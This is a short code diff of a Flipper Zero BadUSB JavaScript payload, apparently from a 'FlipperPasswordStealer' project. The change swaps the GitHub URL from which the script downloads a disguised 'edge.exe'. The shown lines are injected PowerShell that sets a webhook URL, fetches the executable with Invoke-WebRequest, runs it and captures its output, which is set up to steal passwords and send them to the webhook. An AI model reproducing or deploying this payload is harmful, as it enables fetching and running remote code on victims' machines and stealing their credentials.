@@ -2,7 +2,7 @@ let badusb = require("badusb");
 
 let script = [
     "$webhookUrl = '<webhook>';", //Add your webhook url here.
-    "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/edge.exe';",
+    "$exeUrl = 'https://github.com/nmac101/FlipperPasswordStealer/raw/master/build/edge.exe';",
     "$exePath = '.\\edge.exe';",
     "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}",
     "$commandOutput = & $exePath | Out-String;",
